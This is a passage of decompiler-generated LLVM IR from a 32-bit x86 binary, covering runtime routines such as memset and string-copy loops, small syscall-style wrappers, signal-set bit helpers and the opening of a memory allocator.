  %v2_804fe69 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fe69, i32* @esi, align 4
  ret i32 %v4_804fe47

; uselistorder directives
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fe69, { 1, 0 }
}

define i32 @function_804fe6c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fe6c:
  %v0_804fe6c = load i32, i32* @edi, align 4
  %v4_804fe75 = ptrtoint i8* %arg1 to i32
  %v5_804fe79 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_804fe6c, i32* @edi, align 4
  ret i32 %v4_804fe75

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @function_804fe81(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fe81:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804fe82 = load i32, i32* @esi, align 4
  store i32 %v0_804fe82, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804fe8a = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fe8a, i32* %edi.global-to-local, align 4
  %v4_804fe8e.pre = load i32, i32* @eax, align 4
  %v8_804fe8e.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804fe8e

dec_label_pc_804fe8e:                             ; preds = %dec_label_pc_804fe8e.dec_label_pc_804fe8e_crit_edge, %dec_label_pc_804fe81
  %v2_804fe8f = phi i32 [ %v7_804fe8f, %dec_label_pc_804fe8e.dec_label_pc_804fe8e_crit_edge ], [ %v4_804fe8a, %dec_label_pc_804fe81 ]
  %v8_804fe8e = phi i1 [ %v5_804fe8f, %dec_label_pc_804fe8e.dec_label_pc_804fe8e_crit_edge ], [ %v8_804fe8e.pre, %dec_label_pc_804fe81 ]
  %v4_804fe8e = phi i32 [ %v0_804fe90, %dec_label_pc_804fe8e.dec_label_pc_804fe8e_crit_edge ], [ %v4_804fe8e.pre, %dec_label_pc_804fe81 ]
  %v7_804fe8e = phi i32 [ %v0_804fe8e.pre, %dec_label_pc_804fe8e.dec_label_pc_804fe8e_crit_edge ], [ %arg2, %dec_label_pc_804fe81 ]
  %v1_804fe8e = inttoptr i32 %v7_804fe8e to i8*
  %v2_804fe8e = load i8, i8* %v1_804fe8e, align 1
  %v3_804fe8e = zext i8 %v2_804fe8e to i32
  %v5_804fe8e = and i32 %v4_804fe8e, -256
  %v6_804fe8e = or i32 %v3_804fe8e, %v5_804fe8e
  store i32 %v6_804fe8e, i32* %eax.global-to-local, align 4
  %v9_804fe8e = select i1 %v8_804fe8e, i32 -1, i32 1
  %v10_804fe8e = add i32 %v7_804fe8e, %v9_804fe8e
  store i32 %v10_804fe8e, i32* %esi.global-to-local, align 4
  %v3_804fe8f = inttoptr i32 %v2_804fe8f to i8*
  store i8 %v2_804fe8e, i8* %v3_804fe8f, align 1
  %v4_804fe8f = load i32, i32* %edi.global-to-local, align 4
  %v5_804fe8f = load i1, i1* @df, align 1
  %v6_804fe8f = select i1 %v5_804fe8f, i32 -1, i32 1
  %v7_804fe8f = add i32 %v6_804fe8f, %v4_804fe8f
  store i32 %v7_804fe8f, i32* %edi.global-to-local, align 4
  %v0_804fe90 = load i32, i32* %eax.global-to-local, align 4
  %v3_804fe90 = trunc i32 %v0_804fe90 to i8
  %v4_804fe90 = icmp eq i8 %v3_804fe90, 0
  %v1_804fe92 = icmp eq i1 %v4_804fe90, false
  br i1 %v1_804fe92, label %dec_label_pc_804fe8e.dec_label_pc_804fe8e_crit_edge, label %dec_label_pc_804fe94

dec_label_pc_804fe8e.dec_label_pc_804fe8e_crit_edge: ; preds = %dec_label_pc_804fe8e
  %v0_804fe8e.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe8e

dec_label_pc_804fe94:                             ; preds = %dec_label_pc_804fe8e
  store i32 %v4_804fe8a, i32* %eax.global-to-local, align 4
  %v2_804fe99 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fe99, i32* %esi.global-to-local, align 4
  ret i32 %v4_804fe8a

; uselistorder directives
  uselistorder i32 %v0_804fe90, { 1, 0 }
  uselistorder i32 %v7_804fe8f, { 1, 0 }
  uselistorder i1 %v5_804fe8f, { 1, 0 }
  uselistorder i32 %v4_804fe8a, { 1, 2, 0, 3 }
}

define i32 @function_804fe9c() local_unnamed_addr {
dec_label_pc_804fe9c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v2_804fe9f = ptrtoint i32* %stack_var_-4 to i32
  %v2_804fea8 = inttoptr i32 %tmp to i8*
  %v3_804fea8 = call i32 @function_8052041(i8* %v2_804fea8, i32 %v2_804fe9f)
  %v1_804feb3 = icmp eq i32 %v3_804fea8, 0
  br i1 %v1_804feb3, label %dec_label_pc_804febb, label %dec_label_pc_804feb7

dec_label_pc_804feb7:                             ; preds = %dec_label_pc_804fe9c
  %v3_804feb7 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804febb

dec_label_pc_804febb:                             ; preds = %dec_label_pc_804fe9c, %dec_label_pc_804feb7
  %v0_804febb = phi i32 [ -1, %dec_label_pc_804fe9c ], [ %v3_804feb7, %dec_label_pc_804feb7 ]
  ret i32 %v0_804febb

; uselistorder directives
  uselistorder label %dec_label_pc_804febb, { 1, 0 }
}

define i32 @function_804fec1(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804fec1:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fedc = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fee3 = call i32 @function_8051a8b(i32 2, i32 %v2_804fedc)
  ret i32 %v2_804fee3

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804feec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804feec:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804ff07 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804ff0e = call i32 @function_8051a8b(i32 3, i32 %v2_804ff07)
  ret i32 %v2_804ff0e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804ff17(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804ff17:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804ff32 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804ff39 = call i32 @function_8051a8b(i32 6, i32 %v2_804ff32)
  ret i32 %v2_804ff39

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804ff42() local_unnamed_addr {
dec_label_pc_804ff42:
  %stack_var_-20 = alloca i32, align 4
  %v2_804ff6d = ptrtoint i32* %stack_var_-20 to i32
  %v2_804ff74 = call i32 @function_8051a8b(i32 15, i32 %v2_804ff6d)
  ret i32 %v2_804ff74
}

define i32 @function_804ff7d() local_unnamed_addr {
dec_label_pc_804ff7d:
  %stack_var_-16 = alloca i32, align 4
  %v2_804ffa0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804ffa7 = call i32 @function_8051a8b(i32 10, i32 %v2_804ffa0)
  ret i32 %v2_804ffa7
}

define i32 @function_804ffb0() local_unnamed_addr {
dec_label_pc_804ffb0:
  %stack_var_-24 = alloca i32, align 4
  %v2_804ffe3 = ptrtoint i32* %stack_var_-24 to i32
  %v2_804ffea = call i32 @function_8051a8b(i32 12, i32 %v2_804ffe3)
  ret i32 %v2_804ffea
}

define i32 @function_804fff3() local_unnamed_addr {
dec_label_pc_804fff3:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050016 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805001d = call i32 @function_8051a8b(i32 9, i32 %v2_8050016)
  ret i32 %v2_805001d
}

define i32 @function_8050026() local_unnamed_addr {
dec_label_pc_8050026:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050059 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8050060 = call i32 @function_8051a8b(i32 11, i32 %v2_8050059)
  ret i32 %v2_8050060
}

define i32 @function_8050069(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_8050069:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8050094 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805009b = call i32 @function_8051a8b(i32 14, i32 %v2_8050094)
  ret i32 %v2_805009b

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_80500a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80500a4:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80500bf = ptrtoint i32* %stack_var_-12 to i32
  %v2_80500c6 = call i32 @function_8051a8b(i32 1, i32 %v2_80500bf)
  ret i32 %v2_80500c6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8051a8b, { 5, 9, 4, 6, 3, 2, 1, 7, 0, 8 }
}

define i32 @function_80500cf(i32 %arg1) local_unnamed_addr {
dec_label_pc_80500cf:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80500e7, label %dec_label_pc_80500da

dec_label_pc_80500da:                             ; preds = %dec_label_pc_80500cf
  %v1_80500da = add i32 %arg1, -64
  %v3_80500da = sub i32 63, %arg1
  %v4_80500da = and i32 %v3_80500da, %arg1
  %v5_80500da = icmp slt i32 %v4_80500da, 0
  %v6_80500da = icmp eq i32 %v1_80500da, 0
  %v7_80500da = icmp slt i32 %v1_80500da, 0
  %v3_80500dd = icmp eq i1 %v7_80500da, %v5_80500da
  %v4_80500dd = icmp eq i1 %v6_80500da, false
  %v5_80500dd = and i1 %v4_80500dd, %v3_80500dd
  br i1 %v5_80500dd, label %dec_label_pc_80500e7, label %dec_label_pc_80500df

dec_label_pc_80500df:                             ; preds = %dec_label_pc_80500da
  %v4_80500e2 = call i32 @function_80501e5(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80500e7

dec_label_pc_80500e7:                             ; preds = %dec_label_pc_80500da, %dec_label_pc_80500cf, %dec_label_pc_80500df
  %v1_80500e7 = call i32 @function_804fe1b(i32 ptrtoint (i32* @0 to i32))
  %v1_80500ec = inttoptr i32 %v1_80500e7 to i32*
  store i32 22, i32* %v1_80500ec, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80500da, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80500e7, { 2, 0, 1 }
}

define i32 @function_80500f9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80500f9:
  %v3_8050107 = inttoptr i32 %arg1 to i8*
  %v4_8050107 = call i32 @function_804fe6c(i8* %v3_8050107, i32 0, i32 128)
  ret i32 0
}

define i32 @function_8050112(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8050112:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_8050112 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_8050127 = icmp eq i32 %arg2, -1
  %arg1.off = add i32 %arg1, -1
  %tmp35 = icmp ugt i32 %arg1.off, 63
  %tmp36 = or i1 %tmp35, %v10_8050127
  br i1 %tmp36, label %dec_label_pc_8050135, label %dec_label_pc_8050150.lr.ph

dec_label_pc_8050135:                             ; preds = %dec_label_pc_8050112
  %v1_8050135 = call i32 @function_804fe1b(i32 %v0_8050112)
  store i32 %v1_8050135, i32* %eax.global-to-local, align 4
  %v1_805013a = inttoptr i32 %v1_8050135 to i32*
  store i32 22, i32* %v1_805013a, align 4
  br label %dec_label_pc_80501b9

dec_label_pc_8050150.lr.ph:                       ; preds = %dec_label_pc_8050112
  %v15_8050113 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_805015028 = add i32 %v15_8050113, 284
  %v5_805015029 = inttoptr i32 %v4_805015028 to i32*
  store i32 0, i32* %v5_805015029, align 4
  %v0_805015b30 = load i32, i32* %eax.global-to-local, align 4
  %v1_805015b31 = add i32 %v0_805015b30, -1
  %v9_805015b32 = icmp slt i32 %v1_805015b31, 0
  store i32 %v1_805015b31, i32* %eax.global-to-local, align 4
  %v1_805015c33 = icmp eq i1 %v9_805015b32, false
  br i1 %v1_805015c33, label %dec_label_pc_8050150.dec_label_pc_8050150_crit_edge, label %dec_label_pc_805015e

dec_label_pc_8050150.dec_label_pc_8050150_crit_edge: ; preds = %dec_label_pc_8050150.lr.ph, %dec_label_pc_8050150.dec_label_pc_8050150_crit_edge
  %v1_805015b34 = phi i32 [ %v1_805015b, %dec_label_pc_8050150.dec_label_pc_8050150_crit_edge ], [ %v1_805015b31, %dec_label_pc_8050150.lr.ph ]
  %v0_8050150.pre = load i32, i32* @esp, align 4
  %v2_8050150 = mul i32 %v1_805015b34, 4
  %v3_8050150 = add i32 %v0_8050150.pre, 160
  %v4_8050150 = add i32 %v3_8050150, %v2_8050150
  %v5_8050150 = inttoptr i32 %v4_8050150 to i32*
  store i32 0, i32* %v5_8050150, align 4
  %v0_805015b = load i32, i32* %eax.global-to-local, align 4
  %v1_805015b = add i32 %v0_805015b, -1
  %v9_805015b = icmp slt i32 %v1_805015b, 0
  store i32 %v1_805015b, i32* %eax.global-to-local, align 4
  %v1_805015c = icmp eq i1 %v9_805015b, false
  br i1 %v1_805015c, label %dec_label_pc_8050150.dec_label_pc_8050150_crit_edge, label %dec_label_pc_805015e

dec_label_pc_805015e:                             ; preds = %dec_label_pc_8050150.dec_label_pc_8050150_crit_edge, %dec_label_pc_8050150.lr.ph
  %v0_805015e = load i32, i32* @edx, align 4
  %v2_8050161 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_8050161, i32* %eax.global-to-local, align 4
  %v4_8050169 = call i32 @function_80501e5(i32 %v2_8050161, i32 %arg1, i32 %v0_805015e, i32 %v0_805015e)
  store i32 %v4_8050169, i32* %eax.global-to-local, align 4
  %v2_8050171 = icmp slt i32 %v4_8050169, 0
  br i1 %v2_8050171, label %dec_label_pc_80501b9, label %dec_label_pc_8050175

dec_label_pc_8050175:                             ; preds = %dec_label_pc_805015e
  %v4_805017d = call i32 @function_80501c1(i32 ptrtoint (i32* @global_var_8053bc0.30 to i32), i32 %arg1, i32 %v4_8050169, i32 %v4_8050169)
  %v2_8050196 = ptrtoint i32* %stack_var_-284 to i32
  %v2_805019b = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805019b, i32* %eax.global-to-local, align 4
  %v4_80501a4 = call i32 @function_8051997(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8050196)
  store i32 %v4_80501a4, i32* %eax.global-to-local, align 4
  %v2_80501ac = icmp slt i32 %v4_80501a4, 0
  %v3_80501b0 = load i32, i32* %stack_var_-284, align 4
  %.v3_80501b0 = select i1 %v2_80501ac, i32 -1, i32 %v3_80501b0
  br label %dec_label_pc_80501b9

dec_label_pc_80501b9:                             ; preds = %dec_label_pc_8050175, %dec_label_pc_8050135, %dec_label_pc_805015e
  %storemerge = phi i32 [ -1, %dec_label_pc_805015e ], [ -1, %dec_label_pc_8050135 ], [ %.v3_80501b0, %dec_label_pc_8050175 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805015b, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 0, 10, 11, 7, 8 }
  uselistorder i32 284, { 0, 4, 5, 6, 7, 8, 1, 2, 3, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_80501b9, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050150.dec_label_pc_8050150_crit_edge, { 1, 0 }
}

define i32 @function_80501c1(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80501c1:
  %v1_80501cf = add i32 %arg2, -1
  %v1_80501d2 = urem i32 %v1_80501cf, 32
  %v2_80501d2 = icmp eq i32 %v1_80501d2, 0
  %v2_80501d5 = udiv i32 %v1_80501cf, 32
  br i1 %v2_80501d2, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80501c1
  %v5_80501d8 = shl i32 1, %v1_80501d2
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80501c1, %bb
  %v6_80501da = phi i32 [ 1, %dec_label_pc_80501c1 ], [ %v5_80501d8, %bb ]
  %v2_80501da = mul nuw nsw i32 %v2_80501d5, 4
  %v3_80501da = add i32 %v2_80501da, %arg1
  %v4_80501da = inttoptr i32 %v3_80501da to i32*
  %v5_80501da = load i32, i32* %v4_80501da, align 4
  %v7_80501da = and i32 %v5_80501da, %v6_80501da
  %v8_80501da = icmp eq i32 %v7_80501da, 0
  %v1_80501de = icmp eq i1 %v8_80501da, false
  %v2_80501de = zext i1 %v1_80501de to i32
  ret i32 %v2_80501de

; uselistorder directives
  uselistorder i32 %v1_80501d2, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_80501e5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80501e5:
  %stack_var_-4 = alloca i32, align 4
  %v0_80501e5 = load i32, i32* @ebx, align 4
  store i32 %v0_80501e5, i32* %stack_var_-4, align 4
  %v1_80501f3 = add i32 %arg2, -1
  %v1_80501f6 = urem i32 %v1_80501f3, 32
  %v2_80501f6 = icmp eq i32 %v1_80501f6, 0
  store i32 %v1_80501f6, i32* @ecx, align 4
  %v2_80501f9 = udiv i32 %v1_80501f3, 32
  store i32 %v2_80501f9, i32* @edx, align 4
  br i1 %v2_80501f6, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_80501e5
  %v5_80501fc = shl i32 1, %v1_80501f6
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_80501e5, %bb
  %v6_80501fe = phi i32 [ 1, %dec_label_pc_80501e5 ], [ %v5_80501fc, %bb ]
  %v2_80501fe = mul nuw nsw i32 %v2_80501f9, 4
  %v3_80501fe = add i32 %v2_80501fe, %arg1
  %v4_80501fe = inttoptr i32 %v3_80501fe to i32*
  %v5_80501fe = load i32, i32* %v4_80501fe, align 4
  %v7_80501fe = or i32 %v5_80501fe, %v6_80501fe
  store i32 %v7_80501fe, i32* %v4_80501fe, align 4
  %v2_8050203 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050203, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80501f9, { 1, 0 }
  uselistorder i32 %v1_80501f6, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050205() local_unnamed_addr {
dec_label_pc_8050205:
  %v0_8050205 = load i32, i32* @eax, align 4
  %v6_8050218 = icmp ugt i32 %v0_8050205, 16777215
  br i1 %v6_8050218, label %dec_label_pc_8050229, label %dec_label_pc_805021a

dec_label_pc_805021a:                             ; preds = %dec_label_pc_8050205
  %v2_8050208 = udiv i32 %v0_8050205, 256
  %tmp = icmp ult i32 %v0_8050205, 256
  %v2_805021a = call i32 @llvm.ctlz.i32(i32 %v2_8050208, i1 true)
  %v3_805021a = xor i32 %v2_805021a, 31
  %v5_805021a = select i1 %tmp, i32 95, i32 %v3_805021a
  %v1_805021d = add nuw nsw i32 %v5_805021a, 6
  %v2_8050220 = urem i32 %v1_805021d, 32
  %v4_8050220 = icmp eq i32 %v2_8050220, 0
  br i1 %v4_8050220, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_805021a
  %v5_8050220 = lshr i32 %v0_8050205, %v2_8050220
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_805021a, %bb
  %v0_8050222 = phi i32 [ %v0_8050205, %dec_label_pc_805021a ], [ %v5_8050220, %bb ]
  %v1_8050222 = urem i32 %v0_8050222, 4
  %v2_8050225 = mul nuw nsw i32 %v5_805021a, 4
  %v3_8050225 = or i32 %v1_8050222, 32
  %v4_8050225 = add nuw nsw i32 %v3_8050225, %v2_8050225
  br label %dec_label_pc_8050229

dec_label_pc_8050229:                             ; preds = %dec_label_pc_8050205, %bb4
  %v0_805022a = phi i32 [ 95, %dec_label_pc_8050205 ], [ %v4_8050225, %bb4 ]
  ret i32 %v0_805022a

; uselistorder directives
  uselistorder i32 %v2_8050220, { 1, 0 }
  uselistorder i32 %v0_8050205, { 2, 3, 0, 1, 4 }
  uselistorder label %dec_label_pc_8050229, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_805022b(i32 %arg1) local_unnamed_addr {
dec_label_pc_805022b:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805022b = load i32, i32* @ebp, align 4
  %v0_805022c = load i32, i32* @edi, align 4
  %v0_805022d = load i32, i32* @esi, align 4
  %v0_805022e = load i32, i32* @ebx, align 4
  store i32 %v0_805022e, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8050240 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8050240, i32* @eax, align 4
  store i32 %v2_8050240, i32* %stack_var_-92, align 4
  %v2_8050245 = call i32 @function_8051757(i32 %v2_8050240, i32 134551380)
  store i32 %v2_8050245, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805395c.31 to i32), i32* %stack_var_-92, align 4
  %v1_8050251 = call i32 @function_8051754(i32 ptrtoint (i32* @global_var_805395c.31 to i32))
  store i32 %v1_8050251, i32* %eax.global-to-local, align 4
  %v0_8050259 = load i32, i32* %ebx.global-to-local, align 4
  %tmp123 = icmp ult i32 %v0_8050259, -32
  br i1 %tmp123, label %dec_label_pc_8050270, label %dec_label_pc_805025e

dec_label_pc_805025e:                             ; preds = %dec_label_pc_805022b
  %v0_805025e = load i32, i32* %stack_var_-92, align 4
  %v1_805025e = call i32 @function_804fe1b(i32 %v0_805025e)
  store i32 %v1_805025e, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050265 = inttoptr i32 %v1_805025e to i32*
  store i32 12, i32* %v1_8050265, align 4
  br label %dec_label_pc_8050995

dec_label_pc_8050270:                             ; preds = %dec_label_pc_805022b
  %v1_8050270 = add i32 %v0_8050259, 11
  %tmp124 = icmp ult i32 %v1_8050270, 16
  %v1_8050280 = and i32 %v1_8050270, -8
  %v1_8050270.v1_8050280 = select i1 %tmp124, i32 %v1_8050270, i32 %v1_8050280
  %.v1_8050280 = select i1 %tmp124, i32 16, i32 %v1_8050280
  store i32 %v1_8050270.v1_8050280, i32* %eax.global-to-local, align 4
  %v0_8050287 = load i8, i8* @global_var_8053c40.32, align 1
  %v1_8050287 = sext i8 %v0_8050287 to i32
  store i32 %v1_8050287, i32* @ebx, align 4
  %v3_805028d = urem i8 %v0_8050287, 2
  %v4_805028d = icmp eq i8 %v3_805028d, 0
  %v1_8050290 = icmp eq i1 %v4_805028d, false
  br i1 %v1_8050290, label %dec_label_pc_80502af, label %dec_label_pc_8050292

dec_label_pc_8050292:                             ; preds = %dec_label_pc_8050270
  %v2_8050292 = icmp eq i8 %v0_8050287, 0
  %v1_8050294 = icmp eq i1 %v2_8050292, false
  br i1 %v1_8050294, label %dec_label_pc_805058a, label %dec_label_pc_805029a

dec_label_pc_805029a:                             ; preds = %dec_label_pc_8050292
  store i32 ptrtoint (i8* @global_var_8053c40.32 to i32), i32* %stack_var_-92, align 4
  %v2_80502a2 = call i32 @function_8050e48(i32* bitcast (i8* @global_var_8053c40.32 to i32*))
  store i32 %v2_80502a2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805058a

dec_label_pc_80502af:                             ; preds = %dec_label_pc_8050270
  %v11_80502af = trunc i32 %.v1_8050280 to i8
  %v8_80502b3 = icmp ugt i8 %v11_80502af, %v0_8050287
  br i1 %v8_80502b3, label %dec_label_pc_80502d0, label %dec_label_pc_80502b5

dec_label_pc_80502b5:                             ; preds = %dec_label_pc_80502af
  %v2_80502b9 = udiv i32 %.v1_8050280, 2
  store i32 %v2_80502b9, i32* %eax.global-to-local, align 4
  %v1_80502bb = add i32 %v2_80502b9, ptrtoint (i8* @global_var_8053c40.32 to i32)
  store i32 %v1_80502bb, i32* %ecx.global-to-local, align 4
  %v1_80502c1 = add i32 %v2_80502b9, add (i32 ptrtoint (i8* @global_var_8053c40.32 to i32), i32 -4)
  %v2_80502c1 = inttoptr i32 %v1_80502c1 to i32*
  %v3_80502c1 = load i32, i32* %v2_80502c1, align 4
  store i32 %v3_80502c1, i32* @edx, align 4
  %v1_80502c4 = icmp eq i32 %v3_80502c1, 0
  br i1 %v1_80502c4, label %dec_label_pc_80502d0, label %dec_label_pc_80502c8

dec_label_pc_80502c8:                             ; preds = %dec_label_pc_80502b5
  %v1_80502c8 = add i32 %v3_80502c1, 8
  %v2_80502c8 = inttoptr i32 %v1_80502c8 to i32*
  %v3_80502c8 = load i32, i32* %v2_80502c8, align 4
  store i32 %v3_80502c8, i32* %eax.global-to-local, align 4
  store i32 %v3_80502c8, i32* %v2_80502c1, align 4
  br label %dec_label_pc_8050309

dec_label_pc_80502d0:                             ; preds = %dec_label_pc_80502b5, %dec_label_pc_80502af
  %v8_80502d0 = icmp ult i32 %.v1_8050280, 255
  %v6_80502d8 = icmp ugt i32 %.v1_8050280, 255
  store i32 %.v1_8050280, i32* @eax, align 4
  br i1 %v6_80502d8, label %dec_label_pc_8050311, label %dec_label_pc_80502da

dec_label_pc_80502da:                             ; preds = %dec_label_pc_80502d0
  %v2_80502de = udiv i32 %.v1_8050280, 8
  store i32 %v2_80502de, i32* %eax.global-to-local, align 4
  %v1_80502e5 = mul nuw i32 %v2_80502de, 8
  %v2_80502e5 = add i32 %v1_80502e5, ptrtoint (i32* @global_var_8053c6c.33 to i32)
  store i32 %v2_80502e5, i32* %ecx.global-to-local, align 4
  %v1_80502ec = add i32 %v1_80502e5, add (i32 ptrtoint (i32* @global_var_8053c6c.33 to i32), i32 12)
  %v2_80502ec = inttoptr i32 %v1_80502ec to i32*
  %v3_80502ec = load i32, i32* %v2_80502ec, align 4
  store i32 %v3_80502ec, i32* @edx, align 4
  %v12_80502ef = icmp eq i32 %v3_80502ec, %v2_80502e5
  br i1 %v12_80502ef, label %dec_label_pc_805040d.preheader, label %dec_label_pc_80502f7

dec_label_pc_80502f7:                             ; preds = %dec_label_pc_80502da
  store i32 %.v1_8050280, i32* %ebx.global-to-local, align 4
  %v1_80502fb = add i32 %v3_80502ec, 12
  %v2_80502fb = inttoptr i32 %v1_80502fb to i32*
  %v3_80502fb = load i32, i32* %v2_80502fb, align 4
  store i32 %v3_80502fb, i32* %eax.global-to-local, align 4
  store i32 %v3_80502fb, i32* %v2_80502ec, align 4
  %v0_8050301 = load i32, i32* @edx, align 4
  %v1_8050301 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050301 = add i32 %v0_8050301, 4
  %v3_8050301 = add i32 %v2_8050301, %v1_8050301
  %v4_8050301 = inttoptr i32 %v3_8050301 to i32*
  %v5_8050301 = load i32, i32* %v4_8050301, align 4
  %v6_8050301 = or i32 %v5_8050301, 1
  store i32 %v6_8050301, i32* %v4_8050301, align 4
  %v0_8050306 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050306 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050306 = add i32 %v1_8050306, 8
  %v3_8050306 = inttoptr i32 %v2_8050306 to i32*
  store i32 %v0_8050306, i32* %v3_8050306, align 4
  br label %dec_label_pc_8050309

dec_label_pc_8050309:                             ; preds = %dec_label_pc_80506a6, %dec_label_pc_80506b8, %dec_label_pc_80502c8, %dec_label_pc_80502f7
  %v0_8050309 = load i32, i32* @edx, align 4
  %v1_8050309 = add i32 %v0_8050309, 8
  store i32 %v1_8050309, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050984

dec_label_pc_8050311:                             ; preds = %dec_label_pc_80502d0
  %v0_8050315 = call i32 @function_8050205()
  store i32 %v0_8050315, i32* %eax.global-to-local, align 4
  %v3_805031a = and i8 %v0_8050287, 2
  %v4_805031a = icmp eq i8 %v3_805031a, 0
  %v6_805031a = zext i8 %v3_805031a to i32
  %v9_805031a = and i32 %v1_8050287, -256
  %v10_805031a = or i32 %v9_805031a, %v6_805031a
  store i32 %v10_805031a, i32* @ebx, align 4
